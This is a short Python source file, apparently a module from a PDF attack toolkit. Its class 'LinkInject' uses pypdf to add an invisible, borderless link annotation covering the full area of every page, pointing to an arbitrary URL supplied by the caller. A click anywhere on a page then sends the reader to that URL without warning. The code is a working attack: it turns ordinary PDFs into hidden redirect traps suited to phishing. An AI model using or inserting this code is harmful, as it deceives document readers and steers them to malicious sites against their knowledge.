from pypdf.generic import (
    DictionaryObject, NameObject, TextStringObject,
    ArrayObject, NumberObject
)

class LinkInject:
    def __init__(self, url: str):
        self.url = url

    def exploit(self, pdf):
        for page in pdf.pages:
            rect = page.mediabox
            annot = DictionaryObject({
                NameObject("/Type"): NameObject("/Annot"),
                NameObject("/Subtype"): NameObject("/Link"),
                NameObject("/Rect"): rect,
                NameObject("/Border"): ArrayObject([
                    NumberObject(0), NumberObject(0), NumberObject(0)
                ]),
                NameObject("/A"): DictionaryObject({
                    NameObject("/S"): NameObject("/URI"),
                    NameObject("/URI"): TextStringObject(self.url),
                }),
            })
            annot_ref = pdf.add_object(annot)
            pdf.add_annotation(page, annot_ref)
